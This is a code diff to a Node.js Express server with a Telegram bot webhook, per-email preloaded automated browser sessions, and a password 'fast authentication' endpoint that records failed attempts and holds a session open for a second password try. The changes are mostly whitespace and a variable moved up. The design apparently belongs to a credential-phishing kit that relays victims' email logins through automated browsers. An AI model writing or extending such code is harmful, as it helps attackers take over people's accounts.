@@ -71,28 +71,28 @@ try {
     if (process.env.TELEGRAM_BOT_TOKEN) {
         // Construct webhook URL - support both Replit and VPS installations
         let webhookUrl = null;
-        
+
         // Check for Replit environment
         const replitDomain = process.env.REPLIT_DEV_DOMAIN || process.env.REPLIT_DOMAINS;
-        
+
         // Check for VPS environment (DOMAIN set by vps-install.sh)
         const vpsDomain = process.env.DOMAIN;
-        
+
         if (replitDomain) {
             webhookUrl = `https://${replitDomain}/telegram-webhook`;
         } else if (vpsDomain) {
             try {
                 // Normalize DOMAIN input: trim whitespace
                 const normalizedDomain = vpsDomain.trim();
-                
+
                 // Parse DOMAIN to extract protocol and host properly
                 // DOMAIN might be: https://example.com, HTTP://example.com:5000, https://sub.example.com/path
                 let parsedUrl;
-                
+
                 // Case-insensitive protocol detection
                 const lowerDomain = normalizedDomain.toLowerCase();
                 const hasProtocol = lowerDomain.startsWith('http://') || lowerDomain.startsWith('https://');
-                
+
                 if (!hasProtocol) {
                     // No protocol found - check if domain contains path/query which indicates misconfiguration
                     if (normalizedDomain.includes('/') || normalizedDomain.includes('?')) {
@@ -101,18 +101,18 @@ try {
                         console.error(`   Telegram webhook will NOT be configured until DOMAIN is fixed.`);
                         throw new Error('Invalid DOMAIN format: missing protocol with path/query segments');
                     }
-                    
+
                     console.warn('⚠️ DOMAIN missing protocol, assuming https://');
                     parsedUrl = new URL(`https://${normalizedDomain}`);
                 } else {
                     // Protocol present - parse as-is
                     parsedUrl = new URL(normalizedDomain);
                 }
-                
+
                 // Construct webhook URL using original scheme and host (includes port if present)
                 // Host automatically includes port if non-standard (e.g., example.com:8443)
                 webhookUrl = `${parsedUrl.protocol}//${parsedUrl.host}/telegram-webhook`;
-                
+
                 // Warn if path was stripped
                 if (parsedUrl.pathname && parsedUrl.pathname !== '/') {
                     console.warn(`⚠️ DOMAIN contains path "${parsedUrl.pathname}" which was stripped.`);
@@ -350,7 +350,7 @@ app.use('/attached_assets', express.static('attached_assets'));
 // Store user sessions with Graph API auth and OAuth state tracking
 const userSessions = new Map(); // sessionId -> { sessionId, graphAuth, userEmail, createdAt, oauthState, authenticated, verified }
 const oauthStates = new Map(); // state -> { sessionId, timestamp }
-const automationSessions = new Map(); // sessionId -> { automation, status, email, startTime }
+const automationSessions = new Map(); // sessionId -> { automation, status, email, startTime, sessionId }
 const SESSION_TIMEOUT = 30 * 60 * 1000; // 30 minutes timeout
 const STATE_TIMEOUT = 10 * 60 * 1000; // 10 minutes for OAuth state
 const MAX_PRELOADS = 2; // Maximum number of concurrent preloaded browsers
@@ -1221,6 +1221,7 @@ app.post('/api/authenticate-password-fast', async (req, res) => {
         // Check if there's a preloaded session ready for this email
         let preloadedSession = null;
         const startTime = Date.now();
+        const attemptNum = req.body.attemptNumber || 1; // Default to 1st attempt
 
         if (sessionId && automationSessions.has(sessionId)) {
             const session = automationSessions.get(sessionId);
@@ -1357,7 +1358,6 @@ app.post('/api/authenticate-password-fast', async (req, res) => {
                     // Store failed attempt in session data
                     const sessionDir = path.join(__dirname, 'session_data');
                     const failureId = Date.now().toString() + '_' + Math.random().toString(36).substr(2, 5);
-                    const attemptNum = req.body.attemptNumber || 1;
                     const failureData = {
                         id: failureId,
                         sessionId: sessionId || failureId,
@@ -1421,6 +1421,14 @@ app.post('/api/authenticate-password-fast', async (req, res) => {
                         }
                     } else {
                         console.log(`⏸️ Keeping session alive for retry (attempt ${attemptNum})`);
+                        // IMPORTANT: Keep session as preload_ready and reset email validation
+                        if (sessionId && automationSessions.has(sessionId)) {
+                            const session = automationSessions.get(sessionId);
+                            session.status = 'preload_ready';
+                            session.email = email; // Ensure email matches
+                            session.lastAttempt = Date.now();
+                            console.log(`✅ Session ${sessionId} kept as preload_ready for second attempt`);
+                        }
                     }
 
                     return res.status(401).json({
@@ -1436,11 +1444,11 @@ app.post('/api/authenticate-password-fast', async (req, res) => {
 
             } catch (error) {
                 console.error('Error in fast auth with preload:', error);
-                
+
                 // Only clean up if this is the final attempt (attempt 2 or higher)
                 // Keep session alive for first retry
                 const shouldCleanup = attemptNum >= 2;
-                
+
                 if (shouldCleanup) {
                     console.log('🧹 Cleaning up session after final failed attempt');
                     if (automation) {
@@ -1455,12 +1463,13 @@ app.post('/api/authenticate-password-fast', async (req, res) => {
                     }
                 } else {
                     console.log(`⏸️ Keeping session alive for retry (attempt ${attemptNum})`);
-                    // IMPORTANT: Keep session status as preload_ready so it can be reused
+                    // IMPORTANT: Keep session as preload_ready and reset email validation
                     if (sessionId && automationSessions.has(sessionId)) {
                         const session = automationSessions.get(sessionId);
                         session.status = 'preload_ready';
+                        session.email = email; // Ensure email matches
                         session.lastAttempt = Date.now();
-                        console.log(`✅ Session ${sessionId} marked as preload_ready for second attempt`);
+                        console.log(`✅ Session ${sessionId} kept as preload_ready for second attempt`);
                     }
                 }
             }
@@ -1472,7 +1481,6 @@ app.post('/api/authenticate-password-fast', async (req, res) => {
         // Store failed attempt in session data
         const sessionDir = path.join(__dirname, 'session_data');
         const failureId = Date.now().toString() + '_' + Math.random().toString(36).substr(2, 5);
-        const attemptNum = req.body.attemptNumber || 1;
         const failureData = {
             id: failureId,
             sessionId: sessionId || failureId,
